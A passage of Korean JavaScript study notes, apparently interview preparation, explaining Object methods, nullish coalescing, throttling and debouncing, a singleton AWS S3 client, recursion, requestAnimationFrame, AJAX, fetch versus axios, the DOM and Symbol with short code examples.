  const source = { b: 4, c: 5 };

  const returnedTarget = Object.assign(target, source);

  console.log(target); // { a: 1, b: 4, c: 5 }
  ```

- Object.entries : 객체의 키와 벨류를 배열로 반환한다.

  ```js
  const obj = { key1: "value1", key2: "value2" };

  console.log(Object.entries(obj)); // [["key1", "value1"], ["key2", "value2"]]
  ```

- Object.fromEntries : 배열로 된 키와 벨류를 객체로 반환한다. Object.entries의 반대이다.

  ```js
  const arr = [
    ["key1", "value1"],
    ["key2", "value2"],
  ];

  console.log(Object.fromEntries(arr)); // { key1: "value1", key2: "value2" }
  ```

- Object.keys, Object.values : 객체의 키나 벨류를 배열로 반환한다.

  ```js
  const obj = { key1: "value1", key2: "value2" };

  console.log(Object.keys(obj)); // ["key1", "key2"]
  console.log(Object.values(obj)); // ["value1", "value2"]
  ```

- Object.is : 두 값이 같은지 확인하여 boolean을 반환한다. 원시 타입의 경우 값만 비교하고 참조 타입의 경우 같은 참조를 가리키는지 비교한다.

  ```js
  console.log(Object.is(100, 100)); // true
  console.log(Object.is(NaN, NaN)); // true (=== 는 false)
  console.log(Object.is(+0, -0)); // false (=== 는 true)
  ```

- Object.prototype.hasOwnProperty : 객체 내부의 해당 프로퍼티가 프로토체인을 통한 상속이 아닌 직접 존재하는지 확인하여 boolean을 반환한다.

  ```js
  const obj = { a: 1 };

  console.log(obj.hasOwnProperty("a")); // true
  console.log(obj.hasOwnProperty("toString")); // false (상속된 프로퍼티)
  ```

<br>

### # Javascript 내장 객체를 확장하는 것이 왜 좋은 방법이 아닌가?

- 내장 객체를 확장하는 것은 위험한 방법이다. 내장 객체를 확장하게 되면 이 내장 객체를 상속받아 사용하는 모든 객체에 영향이 갈 수 있으므로 확장하지 않는 것이 좋다. 내장 객체를 확장해야 하는 경우는 대체 코드(polyfill)을 추가해야 할 때 뿐이다. 예를 들어 특정 브라우저에서 지원하지 않는 메소드가 있는 경우 대체 코드인 폴리필을 추가해야 할 필요가 생긴다. (ex IE 브라우저가 지원하지 않는 Array.prototype.includes를 사용하려 할 때, Array.prototype에 includes 메소드를 추가)

<br>

### # 옵셔널 체이닝

- 자바스크립트에서 객체나 배열처럼 중첩된 데이터에 접근할 때 중간에 값이 null 또는 undefined인 경우 에러 없이 안전하게 멈추고 undefined를 반환해주는 문법이다. 물음표(?)로 사용할 수 있다.

  ```jsx
  const data = response.data; // data가 null일 수도 있음

  // 옵셔널 체이닝을 쓰면 에러 없이 안전하게 map 호출 가능
  const list = data?.map((item) => `<li>${item.name}</li>`) ?? [];
  ```

<br>

### # ?? (널 병합 연산자) vs || (논리 OR 연산자)

- ?? (널 병합 연산자)

  왼쪽 피연산자가 null 또는 undefined 일 때만 오른쪽 값을 반환, 그 외는 왼쪽 값을 그대로 사용

  ```js
  const a = null ?? "default"; // 'default'
  const b = undefined ?? "default"; // 'default'
  const c = false ?? "default"; // false  (false는 null/undefined가 아님)
  const d = 0 ?? "default"; // 0
  const e = "" ?? "default"; // ''
  ```

- || (논리 OR 연산자)

  왼쪽 피연산자가 falsy 값일 때 모두 오른쪽 값을 반환 (false, 0, '', null, undefined, NaN 등)

  ```js
  const a = null || "default"; // 'default'
  const b = undefined || "default"; // 'default'
  const c = false || "default"; // 'default'
  const d = 0 || "default"; // 'default'
  const e = "" || "default"; // 'default'
  ```

<br>

### # 쓰로틀링, 디바운싱

- 쓰로틀링

  여러 번 연속해서 발생하는 이벤트 중 이벤트를 모두 실행하지 않고 일정 시간 간격으로 실행되도록 제한하는 기법이다. 스크롤, 윈도우 리사이즈 이벤트 등에 자주 쓰인다.

  ```javascript
  import { useState } from "react";

  function Example() {
    const [throttle, setThrottle] = useState(false);
    const [page, setPage] = useState(1);

    const handleScroll = () => {
      if (throttle) return;

      setThrottle(true);
      setTimeout(() => {
        setPage((prevPage) => prevPage + 1);
        setThrottle(false);
      }, 300);
    };

    return (
      <div onScroll={handleScroll}>
        {/* 리스트 렌더링 */}
        <p>현재 페이지: {page}</p>
      </div>
    );
  }
  ```

- 디바운싱

  여러 번 연속해서 발생하는 이벤트 중 마지막 이벤트가 끝난 후 일정 시간 동안 추가 이벤트가 없으면 함수가 실행되도록 하는 기법이다. 검색어 입력, 버튼 클릭 연속 방지 등에 자주 쓰인다.

  ```javascript
  import { useEffect, useState } from "react";

  function Search() {
    const [searchText, setSearchText] = useState("");
    const [query, setQuery] = useState("");

    useEffect(() => {
      const handler = setTimeout(() => {
        setQuery(searchText);
      }, 300);

      // searchText가 바뀌기 전에 이전 타이머 제거
      return () => clearTimeout(handler);
    }, [searchText]);

    return (
      <input
        type="text"
        value={searchText}
        onChange={(e) => setSearchText(e.target.value)}
        placeholder="검색어 입력"
      />
    );
  }
  ```

<br>

### # 불변 객체(immutable)를 만드는 방법

- 기본적으로 원시 타입을 제외한 모든 값은 변경 가능한 값(mutable)이다. 즉 새로운 값을 다시 만들 필요없이 직접 변경이 가능하다는 것이다. 불변 객체를 만들기 위해서는 const와 Object.freeze 메소드를 사용하여 만들 수 있다. 하지만 const로 만드는 경우 재할당은 불가능하지만 할당된 값이 참조 타입인 경우 메모리 힙에 참조 값은 변경(객체 재할당 X 객체 프로퍼티 재할당 O)될 수 있으므로 완전한 불변 객체가 아니다. 또 Object.freeze 메소드는 동결된 객체를 반환하지만 객체의 재할당(객체 재할당 O 객체 프로퍼티 재할당 X)이 가능하므로 완전히 불변 객체가 아니다. 완전한 불변 객체를 만들기 위해 const와 Object.freeze 메소드를 함께 사용할 수 있다. 먼저 const로 바인딩 된 변수를 상수화 시킨 다음, Object.freeze()로 해당 변수를 동결 객체를 만들면 객체의 재할당과 객체의 속성 둘 다 변경 불가능한 불변 객체(객체 재할당 X 객체 프로퍼티 재할당 X)가 된다. 아니면 immutable.js와 같은 라이브러리를 활용하여 불변 객체를 만들 수 있다.

  ```js
  const test = {
    name: "jam",
  };

  Object.freeze(test);
  ```

<br>

### # 자바스크립트의 람다식

- 함수나 메서드를 이름 없이(익명) 간결하게 하나의 표현식으로 정의하는 방식이다. 자바스크립트에서는 화살표 함수가 람다식과 유사한 문법이다.

  ```js
  const add = (a, b) => a + b;
  ```

<br>

### # 싱글턴 패턴

- 개념

  싱글턴 패턴(Singleton Pattern)은 전체 시스템에서 클래스의 인스턴스를 오직 하나만 생성하도록 제한하는 디자인 패턴이다. 이를 통해 전역 상태를 일관되게 공유할 수 있다.

  JavaScript에서는 객체 리터럴로 비슷한 동작을 흉내낼 수 있지만, 객체 리터럴은 생성 시점에 즉시 만들어지고 모든 속성이 외부에 노출된다는 단점이 있다. 또 지연 생성(lazy initialization)이나 캡슐화가 어렵다.

  진정한 싱글턴 패턴은 인스턴스를 한 번만 생성하고, 필요할 때만 초기화하며, 내부 상태를 외부에 숨길 수 있는 구조를 가져야 한다. 이를 위해 즉시 실행 함수(IIFE)를 활용해 비공개 변수와 클로저를 통해 싱글턴을 구현할 수 있다.

  싱글턴을 통해 불필요한 인스턴스 생성을 막고, 항상 동일한 인스턴스를 공유한다. 실무에서는 전역 상태를 제어하거나, 설정/로그/DB 연결 등에 많이 사용된다.

  ```js
  const singleton = (() => {
    let instance; // 인스턴스를 저장할 변수 (비공개)
    const secret = "hello"; // 비공개 데이터

    const createInstance = () => {
      // 인스턴스 내용
      return {
        secretValue: secret,
        showSecret: () => {
          alert(secret);
        },
      };
    };

    return {
      getInstance: () => {
        if (!instance) {
          instance = createInstance(); // 최초 호출 시 인스턴스 생성
        }
        return instance; // 이후에는 기존 인스턴스 반환
      },
    };
  })();

  // 사용 예시
  const first = singleton.getInstance();
  const second = singleton.getInstance();

  console.log(first === second); // true → 동일 인스턴스
  ```

- 예시 (라인쓰리, AWS SDK 활용한 이미지 presignedURL S3 버킷 업로드)

  AWS SDK의 클라이언트 객체(AWS.S3)는 내부적으로 다음과 같은 리소스를 유지한다.

  1. HTTP 연결 풀 : 클라이언트는 HTTP keep-alive로 연결을 재사용하려고 함, 매번 만들면 연결 재사용이 안 되어 성능 저하
  2. Credential 설정 : 클라이언트 객체가 생성될 때 IAM 키를 바탕으로 인증 설정, 반복 생성하면 이 설정 과정을 계속 반복함
  3. Config 캐시 (리전, 서명 버전 등) : 매번 새로 만들면 config 파싱 비용 발생

  getS3Client 내부 프로퍼티를 보면 싱글턴 패턴을 하고 있다. 즉 한 번 생성된 S3 인스턴스(S3 클라이언트)를 재사용하여 비용/성능 최적화하고 있다. 클라이언트 객체 재사용으로 설정/인증 비용 최소화, 연결 재사용으로 빠른 요청 처리 가능, 인스턴스를 1개만 유지하므로 메모리 절약, 동일한 클라이언트로 일관된 처리를 하기 때문에 안정성 증가 등에 장점이 있다.

  ```ts
  import AWS from "aws-sdk";
  import { isUndefined } from "lodash";

  const endpoint = process.env.NEXT_PUBLIC_S3_END_POINT;
  const region = process.env.NEXT_PUBLIC_AWS_REGION;

  const awsClient = (function () {
    let s3Instance: AWS.S3 | undefined;
    let cloudFrontInstance: AWS.CloudFront | undefined;

    return {
      getS3Client: function ({
        accessKeyId,
        secretAccessKey,
      }: {
        accessKeyId: string | undefined;
        secretAccessKey: string | undefined;
      }) {
        if (isUndefined(accessKeyId) || isUndefined(secretAccessKey)) {
          console.error("accessKeyId or secretAccessKey is not provided");
        } else if (!s3Instance) {
          // 인스턴스를 재사용
          s3Instance = new AWS.S3({
            signatureVersion: "v4",
            endpoint,
            region,
            credentials: {
              accessKeyId,
              secretAccessKey,
            },
          });
        }
        return s3Instance;
      },
      getCloudFrontClient: function ({
        accessKeyId,
        secretAccessKey,
      }: {
        accessKeyId: string | undefined;
        secretAccessKey: string | undefined;
      }) {
        if (isUndefined(accessKeyId) || isUndefined(secretAccessKey)) {
          console.error("accessKeyId or secretAccessKey is not provided");
        } else if (!cloudFrontInstance) {
          cloudFrontInstance = new AWS.CloudFront({
            signatureVersion: "v4",
            region,
            credentials: {
              accessKeyId,
              secretAccessKey,
            },
          });
        }
        return cloudFrontInstance;
      },
    };
  })();

  export { awsClient };
  ```

  만약 요청마다 S3 인스턴스를 다시 생성한다면 이건 마치 커피숍에서 매 주문마다 바리스타를 새로 고용하는 것과 같다. 싱글턴 패턴을 사용하면 한 명의 바리스타가 모든 주문을 처리하는 것과 같게 된다.

  ```ts
  // 매번 새로 생성
  const s3 = new AWS.S3(); // 계속 객체 생성 -> 낭비

  // 싱글턴
  let s3Instance: AWS.S3;
  if (!s3Instance) {
    s3Instance = new AWS.S3(); // 최초 1회만 생성
  }
  ```

<br>

### # performance API

- 함수 성능을 측정할 때 사용하는 API이다. 측정 결과는 내부 퍼포먼스 엔트리 버퍼(performance entry buffer)에 수집된다.

  - 측정 메서드

    - performance.now

    - performance.mark

    - performance.measure

  - 결과 확인 메서드

    - performance.getEntries

    - performance.getEntriesByName

    - performance.getEntriesByType

- performance API vs console.time

  | 구분                    | `console.time()`                          | `performance.now()` / `mark()` 등                                    |
  | ----------------------- | ----------------------------------------- | -------------------------------------------------------------------- |
  | **정밀도**              | **ms 단위** (정확도 낮음)                 | **소수점 5자리까지 ms 측정** (고해상도)                              |
  | **기능**                | 단순한 시작/종료 시간 측정                | 여러 지점을 마킹하거나 구간 이름 지정 가능                           |
  | **활용 대상**           | 디버깅/로컬 측정 용도                     | 웹 앱 성능 분석, 정밀 측정, 로그 수집                                |
  | **측정 시점 이름 지정** | 문자열 1개로만 구분 (`console.time('X')`) | 여러 mark를 찍고, 구간 이름 지정 가능                                |
  | **측정 결과 기록**      | 콘솔에 출력됨                             | 브라우저 성능 entry 버퍼에 저장됨                                    |
  | **브라우저 표준 API**   | 아니고, 디버깅용 도구 수준                | **W3C Performance 표준 API**                                         |
  | **지원 환경**           | 거의 모든 브라우저, Node.js 지원          | 대부분 브라우저 지원 (Node에서는 `perf_hooks` 모듈로 유사 기능 가능) |

<br>

### # 숫자 포멧을 바꾸는 방법

| 방법                | 장점                     | 단점/주의점                      |
| ------------------- | ------------------------ | -------------------------------- |
| `toLocaleString()`  | 간단, 네이티브 최적화    | 옵션 제한적                      |
| `Intl.NumberFormat` | 다양한 옵션, 국제화 지원 | 약간 더 복잡                     |
| 정규식              | 커스텀 가능              | 국제화 지원 안 됨, 복잡하면 느림 |

<br>

### # 재귀 함수 (참고 : https://joooing.tistory.com/entry/%EC%9E%AC%EA%B7%80-%E2%86%92-%EA%BC%AC%EB%A6%AC-%EC%9E%AC%EA%B7%80-Tail-Recursion)

- 함수가 자기 자신을 호출하는 것을 재귀함수라고 한다. 재귀함수는 종료조건이 있어야 하며, 종료조건을 설정해주지 않으면 무한 반복을 하게된다. 재귀 함수를 사용하는 이유는 알고리즘 자체가 재귀적으로 표현하기 자연스러울 때 혹은 변수 사용을 줄이기 위해 사용한다.

  재귀 함수의 단점으로는 콜스택의 부하로 인한 메모리 낭비인데 꼬리 재귀(재귀 호출이 끝나면 아무 일도 하지 않고 결과만 바로 반환되도록 하는 방법)를 통해 해결할 수 있다. 꼬리 재귀를 사용하면 이전 함수의 상태를 유지하지도 않고 추가 연산을 하지도 않아서 콜스택의 부하 문제를 해결할 수 있게 된다. 즉 콜스택에 쌓이는 스택을 줄일 수 있다.

  ```js
  // 재귀 함수 : 팩토리얼 예시
  // 팩토리얼 : 1부터 어떤 수까지의 정수를 모두 곱한 값, ex) 5! = 5 × 4 × 3 × 2 × 1 = 120
  function factorial(n) {
    if (n === 1) {
      return 1;
    }
    return n * factorial(n - 1);
  }

  factorial(3); // 6

  /*
    1. factorial(3) 함수 컨텍스트 생성 -> factorial 호출문 만나면 실행 단계 중지 및 인자로 (2) 전달
    2. factorial(2) 함수 컨텍스트 생성 -> factorial 호출문 만나면 실행 단계 중지 및 인자로 (1) 전달
    3. factorial(1) 함수 컨텍스트 생성 -> n이 1이므로 1 출력 -> factorial(1,6) 함수 컨텍스트 제거
    4. factorial(2) 함수 컨텍스트가 n과 전달받은 호출 결과 1을 연산하여 2 출력 -> factorial(2) 함수 컨텍스트 제거
    5. factorial(3) 함수 컨텍스트가 n과 전달받은 호출 결과 2를 연산하여 6 출력 -> factorial(3) 함수 컨텍스트 제거
  */

  // 꼬리 재귀 함수
  function factorial(n, total = 1) {
    if (n === 1) {
      return total;
    }
    return factorial(n - 1, n * total);
  }

  factorial(3); // 6

  /*
    1. factorial(3,1) 함수 컨텍스트 생성 -> factorial 호출문 만나면 인자로 (2,3) 전달 및 호출하며 factorial(3,1) 함수 컨텍스트 제거
    2. factorial(2,3) 함수 컨텍스트 생성 -> factorial 호출문 만나면 인자로 (1,6) 전달 및 호출하며 factorial(2,3) 함수 컨텍스트 제거
    3. factorial(1,6) 함수 컨텍스트 생성 -> n이 1이므로 파라미터로 전달받은 total 변수의 값인 6 출력 후 factorial(1,6) 함수 컨텍스트 제거
  */
  ```

<br>

### # requestAnimationFrame 과 cancelAnimationFrame

- 애니메이션의 프레임(frame)

  사람은 1초에 60개의 프레임을 볼 수 있다고 한다. 그 이상의 프레임을 더 찍어내더라도 사람이 느끼기엔 거의 차이가 없다는 말이다. 그래서 브라우저 렌더링 사이클도 1초에 60번(16.6ms, 1000ms / 60frame) 반복한다. 즉 자바스크립트로 애니메이션을 구현할때도 1초에 60프레임 정도를 찍어내야한다. 16.6ms마다 1프레임을 찍어내기 위해 사용할 수 있는 방법은 setTimeout 혹은 setInterval, requestAnimationFrame 등이 있다.

- requestAnimationFrame(rAF)

  1. 재귀 호출 방식

     함수를 반복할 때 사용할 수 있는 메서드이다. 애니메이션을 구현할 때 사용되며 일반적으로 재귀적인 호출 방식을 통해 반복한다.

  2. 최대 호출 횟수

     Web API에서 동작하며 최대 1초에 60번 동작한다. 다수 애니메이션에도 각각 타이머를 생성하지 않고 동일한 타이머를 참조하게 된다.

  3. 렌더링 사이클 중 리플로우/리페인트 단계 전 정확한 타이밍에 호출

     setTimeout 혹은 setInterval 같은 경우 렌더링 사이클을 고려하지 않고 시간에 따라 실행되기 때문에 프레임 누락이 발생할 수 있다. 반면 requestAnimationFrame의 경우 렌더링 사이클 중 다음 리플로우/리페인트가 발생하기 전 정확한 타이밍에 실행되기 때문에 프레임 누락을 방지할 수 있다.

  4. 백그라운드 동작 및 비활성화시 중지

     브라우저 백그라운드 Web API에서 실행되며 브라우저창이 숨겨지거나 최소화되어 보여지지 않는 경우 애니메이션을 중지시키고 보여질 때 다시 실행시킨다. 이를 통해 CPU 리소스를 절약할 수 있다.

- cancelAnimationFrame(cAF)

  setTimeout의 clearTimeout과 같이 반복되는 requestAnimationFrame 함수를 정지시킬 때 사용한다.

<br>

### # 직렬화, 역직렬화

- 직렬화

  컴퓨터 메모리 상에 존재하는 객체(ex Object)를 저장 혹은 전송 가능한 형태로 변환(ex JSON)하는 것을 말한다. (ex JSON.stringify())

- 역직렬화

  전송 받은 데이터 혹은 문자열(ex JSON)을 컴퓨터 메모리 상에서 사용할 수 있는 객체로 변환(ex Object)하는 것을 말한다. (ex JSON.parse(), res.json())

<br>

### # HTML 문서의 생명주기 이벤트

- DOMContentLoaded

  브라우저가 HTML을 전부 읽고 DOM 트리를 완성하는 즉시 발생한다. 이미지 파일(img 태그)이나 스타일시트 등의 기타 자원은 기다리지 않는다. DOMContentLoaded 이벤트는 document 객체에서 발생한다. 따라서 이 이벤트를 다루려면 addEventListener를 사용해야 한다.

  ```js
  document.addEventListener("DOMContentLoaded", () => {
    alert("DOM이 준비되었습니다!");
  });
  ```

- load

  HTML로 DOM 트리를 만드는 게 완성되었을 뿐만 아니라 이미지, 스타일시트 같은 외부 자원도 모두 불러오는 것이 끝났을 때 발생한다.
  onload 프로퍼티로 발생시킬 수 있다.

  ```js
  window.onload = function () {
    // window.addEventListener('load', (event) => {...}와 동일
    alert("페이지 전체가 로드되었습니다.");
  };
  ```

- beforeunload/unload

  사용자가 페이지를 떠날 때 발생한다. window 객체에서 발생시킬 수 있다.

  ```js
  window.onbeforeunload = function () {
    return "저장되지 않은 변경사항이 있습니다. 정말 페이지를 떠나실 건 가요?";
  };
  ```

<br>

### # 함수 호출 방법 Call by Value & Call by Reference

- Call by Value(값에 의한 호출)

  인자로 원시 타입의 객체를 넘기는 것을 말한다. 함수의 파라미터는 인자와 같은 데이터의 주소 값을 참조하고 있지만 함수 내부에서 파라미터를 수정하는 경우 콜스택에서 새로운 데이터를 생성하여 그 데이터의 주소 값을 참조하기 때문에 원본의 변화는 없다. 값을 복사하여 처리하기 때문에 안전하고 원래의 값이 보존되지만 메모리 사용량이 늘어난다.

  ```js
  // Call by value(값에 의한 호출)
  const a = 1;

  const callByValue = (param) => {
    param = 2;

    return param;
  };

  console.log(callByValue(a)); // 2
  console.log(a); // 1, 원본 변경 X
  ```

- Call by reference(참조에 의한 호출)

  인자로 참조 타입의 객체를 넘기는 것을 말한다. 함수의 파라미터는 인자와 같은 데이터의 주소 값을 참조하고 있어 함수 내부에서 파라미터를 수정하는 경우 원본이 변화된다. 즉 함수의 인자는 얕은 복사를 통해 파라미터로 할당된다. 복사하지 않고 직접 참조를 하기에 처리가 빠르고 새로운 메모리를 할당받지 않지만 원본의 변화가 생길 수 있다. 만약 원본의 변화를 방지하려면 함수 내부에서 파라미터를 깊은 복사하여 참조를 끊어준 뒤 사용하면 된다.

  ```js
  // Call by Reference(참조에 의한 호출)
  const arr = [1, 2, 3];

  const callByReference = (param) => {
    param.push(4);

    return param;
  };

  console.log(callByReference(arr)); // [1, 2, 3, 4]
  console.log(arr); // [1, 2, 3, 4], 원본 변경 O
  ```

<br>

### # AJAX

- AJAX

  AJAX(Asynchronous JavaScript and XML)는 자바스크립트를 이용해서 비동기적(Asynchronous)으로 서버와 브라우저가 데이터를 교환할 수 있는 통신 방식을 의미한다. 과거에는 주로 XMLHttpRequest 객체를 사용해서 AJAX 요청을 보냈고 현재는 axios 라이브러리나 fetch API를 사용한다.

  -> 내가 이해한 내용으로는 AJAX는 방법론이며 브라우저가 AJAX라는 비동기 통신 방법론을 내부적으로 지원하고 구현해서 웹 페이지가 새로고침 없이 백그라운드에서 서버와 데이터를 주고받을 수 있도록 해준다고 이해했다. 즉 AJAX은 비동기 통신 방법 혹은 개념 자체를 이야기하며 HTTP 메서드는 그것을 실제 수행하는 도구라고 이해했다.

- AJAX 사용 이유

  자바스크립트는 싱글 스레드 언어로 한번의 하나의 테스크만 수행하게 된다. 이렇게 동기적으로 작업을 수행되게 되면 원하는 데이터를 원하는 시점에 불러올 수 없는 문제가 발생할 수 있다. 이 때 ajax 비동기 통신을 사용하게 되는데 ajax의 경우 자바스크립트 엔진이 아닌 Web API에서 처리되기 때문에 자바스크립트 엔진이 다른 작업을 수행하고 있다고 해도 블로킹되지 않고 수행되게 된다. 즉 Web API를 통해 멀티 스레드와 같은 효과를 볼 수 있는 것이다. 하지만 XMLHttpRequest는 코드가 직관적이지 않고 요청의 상태나 변경을 구독하기 위해서는 이벤트를 등록해서 변경사항을 받아야 하며 요청의 성공, 실패 여부나 상태에 따라 처리하는 로직이 들어가기 좋지 않다는 문제가 있다. 그렇기 때문에 XMLHttpRequest를 대체하여 프로미스 기반의 axios 라이브러리를 사용하거나 내장 라이브러리인 fetch를 사용할 수 있다.

- XML(eXtensible Markup Language)

  XML은 데이터 포맷 중 하나로 HTML과 유사한 마크업 언어이다. 데이터를 저장하고, 전달할 목적으로 고안되었다. 불필요한 태그들이 들어가 파일의 사이즈가 커질 뿐만 아니라 가독성도 좋지 않아 XML대신 JSON이 사용된다.

  ```xml
  <dog>
    <name>식빵</name>
    <family>웰시코기<family>
    <age>1</age>
    <weight>2.14</weight>
  </dog>
  ```

- JSON(JavaScript Object Notation)

  JSON은 데이터 포맷 중 하나로 XML과 마찬가지로 데이터 저장과 전달을 목적으로 고안되었으며, 자바스크립트 기반으로 작성되었으며 key와 value가 한 쌍을 이루는 구조의 객체로 구성되어 있다. XML의 대안으로서 고안되었으며, XML 대비 더 직관적이며, 작성하기 편리하며 프로그래밍 언어나 플랫폼에 상관없이 사용할 수 있다.

  ```json
  {
    "name": "식빵",
    "family": "웰시코기",
    "age": 1,
    "weight": 2.14
  }
  ```

<br>

### # fetch vs axios

| 구분                  | fetch                                                            | axios                                            |
| --------------------- | ---------------------------------------------------------------- | ------------------------------------------------ |
| 응답 처리             | Response 객체 반환, `.json()` 같은 메서드로 파싱 필요            | 응답 데이터를 바로 JSON 형태로 반환              |
| 기본 오류 처리        | HTTP 오류 상태(404, 500 등)도 정상 응답으로 처리, 수동 처리 필요 | HTTP 오류 상태일 때 자동으로 에러 처리 (reject)  |
| 요청 취소 지원        | AbortController 사용해서 취소 가능                               | 내장된 취소 토큰(CancelToken) 기능 제공          |
| 인터셉터 기능         | 없음 (window.fetch = () => { ... }와 같이 오버라이딩 가능)       | 요청/응답 인터셉터 기능 제공 (로깅, 에러처리 등) |
| 요청 데이터 자동 변환 | 직접 변환 필요                                                   | 자동으로 JSON 변환 및 직렬화 처리                |
| 지원하는 기능         | 기본적인 HTTP 요청                                               | 더 편리한 HTTP 요청/응답 처리 기능 제공          |

```javascript
// fetch
fetch("url")
  .then((response) => {
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    return response.json();
  })
  .then((data) => {
    // Handle data
  })
  .catch((error) => {
    // Handle error
  });

// axios
axios
  .get("url")
  .then((response) => {
    // Handle response data
  })
  .catch((error) => {
    // Handle error
  });
```

<br>

### # axios의 withCredential과 fetch의 credential

- withCredential을 직역해보면 자격 증명을 함께라고 해석할 수 있다. 단어의 의미만 봐도 알 수 있듯이 무언가 인증할 때 필요한 옵션인 것을 알 수 있다. 정확히 withCredential 옵션의 역할은 서로 다른 도메인(크로스 도메인)에 요청을 보낼 때 요청에 Credential 정보를 담아서 보낼 지를 결정하는 옵션이다. axios에서는 withCredential , fetch에서는 credential로 지정할 수 있다.

  예를 들어 쿠키를 요청 헤더에 포함해야할 때 같은 도메인 요청 시 자동으로 포함되지만 서로 다른 도메인인 경우 해당 옵션을 true로 설정해주어야 요청 헤더에 포함된다.

  ex) 요청 origin이 `https://example.com`, API URL이 `https://example.com/api`인 경우 같은 도메인, 요청 origin이 `https://example.com`, API URL이 `https://api.example.com/api`인 경우 크로스 도메인, 프로토콜 + 도메인 + 포트번호까지 같아야 같은 도메인으로 취급된다. 예시의 경우 배포 환경에서 HTTPS 프로토콜의 기본 포트인 443 포트를 사용한다는 가정 하에 `https://example.com`과 `https://example.com/api`이 같은 도메인이라고 취급하는 것이다.)

  ```javascript
  /* axios */
  axios.get("https://example.com/items", {
    withCredentials: false, // default
  });

  /* fetch API */
  fetch("https://example.com:1234/users", {
    credentials: "include",
  });
  ```

- credential 정보가 포함되어 있는 요청은 아래 두 가지 경우를 의미한다.

  1. 쿠키를 첨부해서 보내는 요청

  2. 헤더에 Authorization 항목이 있는 요청

<br>

### # 가비지 컬렉터

- 가비지 컬렉터

  가비지 컬렉터는 `참조 카운팅`, `마크 앤 스윕` 알고리즘을 통해 메모리 힙에서 메모리 관리를 수행한다. 즉 메모리를 차지하는 데이터 중 사용하지 않는 데이터를 자동으로 삭제한다. 또한 자바스크립트는 자동으로 가비지 컬렉팅을 수행한다. 자바스크립트에서 데이터는 원시타입의 경우 콜스택, 참조타입의 경우 메모리 힙에 저장되는데 주소와 값에 형태로 저장되고 저장 된 데이터가 사용될 때는 주소와 값 중 주소 값을 참조하여 사용되게 된다. 만약 메모리 힙에서 객체나 배열 자신의 주소 값을 참조하는 식별자가 없는 경우 사용하지 않는 데이터이기 때문에 가비지 컬렉터에 의해 삭제되게 되는 것이다. 반면 콜스택의 원시 타입 데이터의 경우 전역 컨텍스트나 함수 컨텍스트가 종료될 때 자동으로 메모리에서 함께 제거된다.

  - 참조 카운팅: 객체가 참조되는 횟수를 세서 0이 되면 해제

  - 마크 앤 스윕: 도달할 수 없는 객체를 표시(mark)하고 한꺼번에 제거(sweep)

<br>

### # 비즈니스 로직

유저의 눈에 보이지는 않지만, 유저가 바라는 결과물을 올바르게 도출할 수 있게 짜여진 로직을 말한다. 예를 들어 유저가 회원가입 시 아이디가 사용되고 있는 아이디인지 검사 후 메세지를 통해 중복인지 아닌지를 확인할 수 있는 로직을 짯다고 가정했을 때 중복 아이디를 검사하는 로직이 비지니스 로직이 되고 비지니스 로직을 통한 결과를 단순히 메세지를 통해 유저에게 보여주기 위한 로직이 뷰 로직이 된다.

<br>

### # DOM

- DOM(Document Object Model)

  DOM은 문서 객체 모델이며 HTML이나 XML 문서를 브라우저의 렌더링 엔진이 HTML을 파싱하여 메모리에 저장한 객체 모델이며, 자바스크립트를 통해 문서 구조를 동적으로 읽고 조작할 수 있도록 도와주는 일종의 인터페이스입니다. DOM 트리는 크롬 개발자 도구 엘리먼트 탭에 하위 탭인 프로퍼티 탭에서 확인할 수 있다.

- HTML과 DOM의 차이

  - HTML

    웹 페이지를 표시하기 위해 태그, 속성 등 정해진 규칙에 따라 작성되는 언어 (정적인 구조)

  - DOM

    DOM은 브라우저의 HTML 파서가 HTML 파싱한 후 생성되는 객체 모델로 HTML 문서에 접근하기 위한 일종의 인터페이스 (브라우저 HTML을 해석해 만든 동적인 구조, javascript에 의해 변할 수 있다)

- DOM을 직접 접근할 때의 문제점

  DOM 조작 자체는 가능하지만, 직접 DOM을 반복적으로 다루는 방식은 코드가 복잡해지고 브라우저의 최적화 여지를 줄여 성능 저하의 원인이 될 수 있따. 이를 개선하기 위해 React는 변경 전후의 DOM을 비교(diffing)하여 필요한 최소한의 변경만 실제 DOM에 반영하는 가상 DOM(Virtual DOM) 개념을 도입했다.

<br>

### # 오버로딩(Overloading) vs 오버라이딩(Overriding)

- 오버라이딩(Overriding)

  상위 클래스가 가지고 있는 메소드를 하위 클래스가 재정의(복붙)하여 사용하는 방식이다. 자바스크립트의 클래스 확장 시 상속받는 클래스 내부에 super 키워드를 활용하여 오버라이딩 할 수 있다. constructor 내부에서 선언 시 생성자 오버라이딩을 할 수 있고 클래스 바디에 선언 시 메소드 오버라이딩을 할 수 있다.

  ```js
  class Animal {
    speak() {
      console.log("Animal speaks");
    }
  }

  class Dog extends Animal {
    speak() {
      super.speak(); // 부모 메서드 호출
      console.log("Dog barks");
    }
  }

  const dog = new Dog();
  dog.speak();
  // Animal speaks
  // Dog barks
  ```

- 오버로딩(Overloading)

  같은 이름의 함수를 여러 개 만든 뒤 각각의 함수에 매개변수의 타입, 갯수를 다르게 지정하여 호출 시 전달되는 인자에 타입이나 갯수에 따라 실행 될 함수를 매칭하여 다른 출력 값을 받는 방식을 말한다. 자바스크립트에서는 arguments 객체의 바인딩 되는 인자를 조건으로 하여 구현하거나, 조건문과 인자의 타입이 함수(function)인지를 평가하는 typeof 연산자를 함께 활용하여 구현할 수 있다.

  ```js
  function greet(name: string): string;
  function greet(age: number): string;
  function greet(value: any): string {
    if (typeof value === 'string') return `Hello, ${value}`;
    if (typeof value === 'number') return `You're ${value} years old`;
    return 'Hi';
  }

  greet('Jane'); // Hello, Jane
  greet(25);     // You're 25 years old
  ```

<br>

### # symbol 타입

- 심볼은 변경 불가능(immutable)한 원시 타입의 값이며, 다른 값과 중복되지 않는 유니크한 원시 타입의 값이다. 심볼은 객체의 프로퍼티 키로 사용할 수 있고 심볼 값을 키로 갖는 프로퍼티는 일반 문자열 키와는 충돌하지 않아 안전한 확장에 유용하다. Symbol(), Symbol.for()로 생성 가능하다. Symbol()의 경우 같은 키를 사용할 때마다 항상 새로운 고유 값이 생성되지만 Symbol.for()의 경우 생성한 심볼을 전역 심볼 레지스트리에 저장하여 같은 키를 사용할 때 재사용하여 참조가 동일하다.

  ```javascript
  // Symbol() -> 고유함
  const a = Symbol("id");
  const b = Symbol("id");
  console.log(a === b); // false
  ```

  ```javascript
  // Symbol.for() -> 고유하지만 같은 값을 공유
  const a = Symbol.for("foo");
  const b = Symbol.for("foo");

  console.log(a === b); // ✅ true
  ```

  ```javascript
